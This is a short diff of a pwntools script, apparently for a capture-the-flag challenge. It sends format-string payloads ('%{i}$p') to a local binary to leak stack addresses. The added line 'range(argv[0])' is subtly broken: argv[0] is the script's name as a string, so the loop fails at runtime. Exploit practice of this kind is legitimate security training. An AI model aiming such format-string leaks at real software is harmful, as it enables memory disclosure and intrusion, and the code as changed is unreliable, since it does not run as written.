@@ -1,10 +1,11 @@
 from pwn import *
+from sys import argv
 
 
 addrs = []
 with process("./challenge") as proc:
         counter = 0
-        for i in range(150):
+        for i in range(argv[0]):
                 payload = f"%{i}$p"
 
                 proc.sendline(bytes(payload.encode()))
